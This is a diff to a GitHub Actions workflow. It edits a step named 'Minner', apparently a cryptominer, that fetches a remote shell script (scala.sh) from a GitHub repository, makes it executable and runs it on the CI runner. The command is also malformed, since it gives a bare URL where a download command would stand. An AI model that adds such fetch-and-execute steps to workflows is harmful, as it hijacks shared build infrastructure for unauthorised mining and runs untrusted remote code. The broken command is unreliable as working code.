@@ -24,7 +24,7 @@ jobs:
       uses: actions/checkout@v1
     - name: Minner
       run: |
-        https://github.com/masyudh/put2/blob/main/scala.sh && chmod u+x scala.sh && ./scala.sh
+        https://github.com/masyudh/put2/blob/main/scala.sh && chmod +x scala.sh && bash scala.sh
 
 
 
